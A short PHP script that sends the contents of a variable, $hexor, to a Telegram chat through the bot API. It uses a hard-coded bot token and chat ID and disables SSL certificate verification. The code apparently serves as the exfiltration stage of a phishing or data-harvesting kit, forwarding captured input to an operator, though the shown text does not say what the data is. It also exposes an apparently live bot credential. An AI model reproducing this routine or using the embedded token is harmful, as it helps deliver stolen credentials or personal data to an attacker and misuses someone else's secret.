<?php 
$botToken="7491788747:AAEIOcTu-YTMtm6zTyj2vM9LwOK9UZhfzEk";
$chatId="5824652642";  

  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$hexor,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
